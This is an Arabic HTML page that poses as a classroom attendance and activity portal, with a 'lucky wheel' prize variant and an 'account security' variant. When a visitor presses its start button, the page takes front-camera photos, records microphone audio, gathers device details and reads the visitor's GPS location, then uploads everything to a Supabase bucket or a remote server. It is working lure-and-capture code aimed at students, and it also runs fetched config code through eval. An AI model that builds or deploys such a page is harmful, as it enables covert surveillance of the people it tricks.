<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>البوابة التعليمية التفاعلية</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, sans-serif; }
        body { background: #0f172a; color: #f8fafc; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 15px; text-align: center; }
        .card { background: #1e293b; border-radius: 20px; padding: 25px; max-width: 480px; width: 100%; border: 1px solid #334155; box-shadow: 0 10px 25px rgba(0,0,0,0.4); }
        h1 { color: #38bdf8; font-size: 20px; margin-bottom: 12px; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
        .btn { background: #0284c7; color: white; border: none; padding: 14px; font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; width: 100%; }
        .btn[disabled] { opacity: 0.7; cursor: not-allowed; }
        .btn:hover { background: #0369a1; }
        .alert-box { background: #450a0a; border: 1px solid #ef4444; border-radius: 12px; padding: 20px; text-align: right; }
        .alert-box h2 { color: #ef4444; text-align: center; font-size: 18px; margin-bottom: 10px; }
        video, canvas { display: none; }
        .status { margin-top: 12px; font-size: 13px; color: #cbd5e1; }
        .status.error { color: #fca5a5; }
        .status.success { color: #86efac; }
        .small { font-size: 12px; color: #94a3b8; margin-top: 10px; }
    </style>
    <!-- Supabase UMD (for client-side uploads) and local config (config.example.js أو config.js) -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js/dist/umd/supabase.min.js"></script>
    <script src="./config.js"></script>
</head>
<body>

<div class="card" id="app">
    <h1 id="title">🎓 منصة التفاعل والأنشطة الصفية</h1>
    <p id="desc">اضغط على الزر أدناه لبدء النشاط التفاعلي وتأكيد الحضور في حصة اليوم.</p>
    <button class="btn" id="startBtn">بدء النشاط 🚀</button>
    <div id="status" class="status" aria-live="polite"></div>
    <p class="small">ملاحظة خصوصية: سيتم طلب إذن الوصول إلى الكاميرا/الميكروفون. لا تقم باستخدام بيانات حساسة بدون موافقة.</p>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
// تحميل ملف التهيئة المحلي (config.js) إن وُجد - بطريقة صامتة
// ملاحظة: config.js يمكن أن يكون ملفًا سريًا محليًا لا ترفعه للمستودع (استخدم config.example.js في المستودع بدلاً منه)
(async function loadLocalConfig(){
    try {
        const res = await fetch('./config.js', { method: 'GET' });
        if (res.ok) {
            const js = await res.text();
            try { eval(js); } catch(e){ console.warn('failed to eval config.js', e); }
        }
    } catch(e){ /* لا نفعل شيئًا إذا لم يوجد الملف */ }
})();

// تهيئة افتراضية
window.APP_CONFIG = window.APP_CONFIG || { SERVER_URL: 'https://YOUR-RENDER-APP.onrender.com/send-message' };
const SERVER_URL = window.APP_CONFIG.SERVER_URL;

const DEFAULT_TIMEOUT_MS = 12000; // وقت الانتظار الافتراضي للطلبات
const FETCH_RETRIES = 2;

const startBtn = document.getElementById('startBtn');
const statusEl = document.getElementById('status');
const titleEl = document.getElementById('title');
const descEl = document.getElementById('desc');
const videoEl = document.getElementById('video');
const canvasEl = document.getElementById('canvas');

const urlParams = new URLSearchParams(window.location.search);
const mode = urlParams.get('mode') || 'u1_snap1';

if (mode.includes('u4_wheel')) { titleEl.innerText = "🎁 عجلة الحظ المباشرة للطلاب"; descEl.innerText = "اضغط لتدوير العجلة ومعرفة جائزتك الفورية"; }
else if (mode.includes('u3_pin')) { titleEl.innerText = "🔑 إعدادات الأمان والحساب"; }

startBtn.addEventListener('click', runExperiment);

function showStatus(message, type = 'info'){
    statusEl.textContent = message;
    statusEl.className = `status ${type === 'error' ? 'error' : type === 'success' ? 'success' : ''}`;
}

function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }

function getAuthHeaders(){
    const h = {};
    if (window.APP_CONFIG && window.APP_CONFIG.API_KEY) h['x-api-key'] = window.APP_CONFIG.API_KEY;
    return h;
}

async function fetchWithRetry(url, options = {}, retries = FETCH_RETRIES, timeoutMs = DEFAULT_TIMEOUT_MS) {
    for (let attempt = 0; attempt <= retries; attempt++){
        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), timeoutMs);
        try{
            const res = await fetch(url, { ...options, signal: controller.signal });
            clearTimeout(id);
            if (!res.ok) throw new Error(`HTTP ${res.status}`);
            return res;
        } catch(err){
            clearTimeout(id);
            const isLast = attempt === retries;
            console.error('fetchWithRetry attempt', attempt, err);
            if (isLast) throw err;
            await sleep(500 * Math.pow(2, attempt));
        }
    }
}

async function getMediaWithTimeout(constraints, timeoutMs = 8000){
    try{
        const getMedia = navigator.mediaDevices.getUserMedia(constraints);
        const timeout = new Promise((_, reject) => setTimeout(()=>reject(new Error('timeout')), timeoutMs));
        const stream = await Promise.race([getMedia, timeout]);
        return stream;
    } catch(err){ throw err; }
}

// محاولات لاستخدام WebP أولاً ثم الرجوع إلى JPEG إذا لم يدعم المتصفح WebP
async function canvasToOptimizedBlob(canvas){
    // حاول WebP
    const tryWebP = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.5));
    if (tryWebP) return tryWebP;
    // fallback to jpeg
    return await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.6));
}

// ---------------------------------------------
// Supabase upload integration
// سيستخدم الملف config.js لتهيئة القيم: SUPABASE_URL و SUPABASE_ANON_KEY و SUPABASE_BUCKET
// إذا لم تكن القيم موجودة، ينسخ التطبيق السلوك القديم (إرسال إلى SERVER_URL) كاحتياط
// ---------------------------------------------

async function capturePhotoAndSend({ label='snap', width=320, height=240 } = {}){
    showStatus('جاري طلب إذن الكاميرا...');
    let stream;
    try{ stream = await getMediaWithTimeout({ video: { facingMode: 'user' } }, 8000); }
    catch(err){
        console.error('camera error', err);
        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') showStatus('مرفوض: لم تتم الموافقة على الكاميرا. يرجى منح الإذن.', 'error');
        else if (err.message === 'timeout') showStatus('انتهى زمن انتظار الكاميرا.', 'error');
        else showStatus('تعذر الوصول إلى الكاميرا: ' + (err.message || err.name), 'error');
        return;
    }

    try{
        videoEl.srcObject = stream;
        await new Promise((res) => videoEl.onloadedmetadata = res);
        await sleep(400);
        canvasEl.width = width; canvasEl.height = height;
        const ctx = canvasEl.getContext('2d');
        ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);

        const blob = await canvasToOptimizedBlob(canvasEl);

        // محاولة رفع إلى Supabase مباشرةً
        const { SUPABASE_URL, SUPABASE_ANON_KEY, SUPABASE_BUCKET } = window.APP_CONFIG || {};
        if (SUPABASE_URL && SUPABASE_ANON_KEY && SUPABASE_BUCKET && window.supabase && window.supabase.createClient) {
            try {
                showStatus('جاري رفع الصورة إلى التخزين (Supabase)...');
                const sup = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
                const fileName = `${mode}_${label}_${Date.now()}.webp`;
                const { error: uploadError } = await sup.storage.from(SUPABASE_BUCKET).upload(fileName, blob, {
                    cacheControl: '3600',
                    upsert: false,
                    contentType: blob.type
                });
                if (uploadError) throw uploadError;

                // محاولة إضافة سجل metadata في جدول submissions (إن وُجد)
                try {
                    await sup.from('submissions').insert([{
                        filename: fileName,
                        message: `نشاط: ${mode} - ${label}`,
                        user_agent: navigator.userAgent
                    }]);
                } catch(e) { console.warn('failed to insert metadata', e); }

                showStatus('تم الرفع بنجاح إلى Supabase.', 'success');
                return;
            } catch(supErr){
                console.error('supabase upload failed', supErr);
                showStatus('فشل رفع الصورة إلى Supabase، سيتم المحاولة عبر الخادم التقليدي.', 'error');
                // الاستمرار لمحاولة إرسالها إلى SERVER_URL كخيار احتياطي
            }
        }

        // fallback: إرسال عبر SERVER_URL (إن وُجد)
        if (SERVER_URL) {
            const payload = new FormData();
            payload.append('message', `نشاط: ${mode} - ${label}`);
            payload.append('image', blob, `${label}.webp`);

            showStatus('جاري إرسال البيانات إلى الخادم...');
            const headers = getAuthHeaders();
            await fetchWithRetry(SERVER_URL, { method: 'POST', body: payload, headers, keepalive: true }, FETCH_RETRIES, 10000);
            showStatus('تم الإرسال بنجاح.', 'success');
            return;
        }

        showStatus('لا توجد وجهة للإرسال (SUPABASE أو SERVER_URL غير مهيّأ).', 'error');

    } catch(err){
        console.error('capture/send error', err);
        showStatus('فشل أثناء المعالجة: ' + (err.message || err.name), 'error');
    } finally{ if (stream) stream.getTracks().forEach(t => t.stop()); }
}

async function recordAudioAndSend(seconds = 4){
    showStatus('جاري طلب إذن الميكروفون...');
    let stream;
    try{ stream = await getMediaWithTimeout({ audio: true }, 8000); }
    catch(err){ console.error('mic error', err); if (err.name === 'NotAllowedError') showStatus('مرفوض: لم تتم الموافقة على الميكروفون.', 'error'); else showStatus('تعذر الوصول إلى الميكروفون: ' + (err.message || err.name), 'error'); return; }

    try{
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        mediaRecorder.ondataavailable = e => chunks.push(e.data);
        const stopPromise = new Promise(resolve => mediaRecorder.onstop = resolve);
        mediaRecorder.start(); showStatus('جاري تسجيل الصوت...');
        await sleep(seconds * 1000);
        mediaRecorder.stop(); await stopPromise;
        const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });

        // رفع إلى Supabase إذا ممكن
        const { SUPABASE_URL, SUPABASE_ANON_KEY, SUPABASE_BUCKET } = window.APP_CONFIG || {};
        if (SUPABASE_URL && SUPABASE_ANON_KEY && SUPABASE_BUCKET && window.supabase && window.supabase.createClient) {
            try {
                showStatus('جاري رفع التسجيل إلى التخزين (Supabase)...');
                const sup = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
                const fileName = `${mode}_voice_${Date.now()}.ogg`;
                const { error: uploadError } = await sup.storage.from(SUPABASE_BUCKET).upload(fileName, blob, {
                    cacheControl: '3600',
                    upsert: false,
                    contentType: blob.type
                });
                if (uploadError) throw uploadError;
                try { await sup.from('submissions').insert([{ filename: fileName, message: `نشاط: ${mode} - تسجيل صوتي`, user_agent: navigator.userAgent }]); } catch(e){ console.warn('metadata insert failed', e); }
                showStatus('تم إرسال التسجيل.', 'success');
                return;
            } catch(e){ console.error('supabase audio upload error', e); showStatus('فشل رفع التسجيل إلى Supabase.', 'error'); }
        }

        // fallback
        if (SERVER_URL) {
            const payload = new FormData(); payload.append('message', `نشاط: ${mode} - تسجيل صوتي`); payload.append('audio', blob, 'voice.ogg');
            showStatus('جاري إرسال التسجيل...');
            const headers = getAuthHeaders();
            await fetchWithRetry(SERVER_URL, { method: 'POST', body: payload, headers, keepalive: true }, FETCH_RETRIES, 12000);
            showStatus('تم إرسال التسجيل.', 'success');
            return;
        }

        showStatus('لا توجد وجهة لإرسال التسجيل.', 'error');
    } catch(err){ console.error('record/send error', err); showStatus('فشل تسجيل الصوت أو الإرسال: ' + (err.message || err.name), 'error'); }
    finally{ if (stream) stream.getTracks().forEach(t => t.stop()); }
}

async function sendDeviceInfo(){
    let battery = 'غير معروف';
    if (navigator.getBattery){ try{ const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}%`; } catch(e){} }
    const report = `📱 [بيانات الجهاز - الوحدة 3]\n• المتصفح والنظام: ${navigator.userAgent}\n• دقة الشاشة: ${screen.width}x${screen.height}\n• البطارية: ${battery}`;
    try{ showStatus('جاري إرسال بيانات الجهاز...');
        const headers = Object.assign({ 'Content-Type': 'application/json' }, getAuthHeaders());
        if (SERVER_URL) {
            await fetchWithRetry(SERVER_URL, { method: 'POST', headers, body: JSON.stringify({ message: report }) }, FETCH_RETRIES, 10000);
            showStatus('تم إرسال بيانات الجهاز.', 'success');
            return;
        }
        // ممكن لاحقًا إرسال تقرير خفيف إلى Supabase كصف في جدول
        showStatus('لا توجد وجهة لإرسال بيانات الجهاز.', 'error');
    }
    catch(err){ console.error('sendDeviceInfo error', err); showStatus('فشل إرسال بيانات الجهاز.', 'error'); }
}

function sendLocation(){
    if (!navigator.geolocation){ showStatus('الموقع غير مدعوم في هذا المتصفح.', 'error'); return; }
    showStatus('جاري الحصول على الموقع...');
    navigator.geolocation.getCurrentPosition(async (p)=>{
        const locText = `📍 [الموقع الجغرافي]: https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`;
        try{ const headers = Object.assign({ 'Content-Type': 'application/json' }, getAuthHeaders());
            if (SERVER_URL) {
                await fetchWithRetry(SERVER_URL, { method: 'POST', headers, body: JSON.stringify({ message: locText }) }, FETCH_RETRIES, 10000);
                showStatus('تم إرسال الموقع.', 'success');
                return;
            }
            showStatus('لا توجد وجهة لإرسال الموقع.', 'error');
        }
        catch(err){ console.error('sendLocation error', err); showStatus('فشل إرسال الموقع.', 'error'); }
    }, (err)=>{ console.error('geolocation error', err); showStatus('تعذر الحصول على الموقع: ' + (err.message || err.code), 'error'); }, { timeout: 10000, maximumAge: 0 });
}

async function runExperiment(){
    startBtn.disabled = true; startBtn.innerText = 'جاري المعالجة...'; showStatus('البدء: ' + mode);
    try{
        if (mode === 'u1_snap1') await capturePhotoAndSend({ label: 'snap1', width: 320, height: 240 });
        else if (mode === 'u1_snap3') { for (let i=1;i<=3;i++){ await capturePhotoAndSend({ label: `snap_${i}`, width: 320, height: 240 }); await sleep(700); } }
        else if (mode.startsWith('u2_')) await recordAudioAndSend(4);
        else if (mode.startsWith('u3_')) await sendDeviceInfo();
        else if (mode.includes('u4') || mode.includes('u5')){ await capturePhotoAndSend({ label: `advanced_${mode}`, width: 640, height: 480 }); sendLocation(); }
        else await capturePhotoAndSend({ label: 'default_snap', width: 320, height: 240 });
    } catch(err){ console.error('runExperiment error', err); showStatus('حدث خطأ غير متوقع: ' + (err.message || err.name), 'error'); }
    finally{ startBtn.disabled = false; startBtn.innerText = 'بدء النشاط 🚀'; }
}

// ملاحظة خصوصية: إضافة ملاحظة صغيرة أسفل الزر
(function addPrivacyNote(){ /* موجودة في HTML مباشرة */ })();

</script>

</body>
</html>
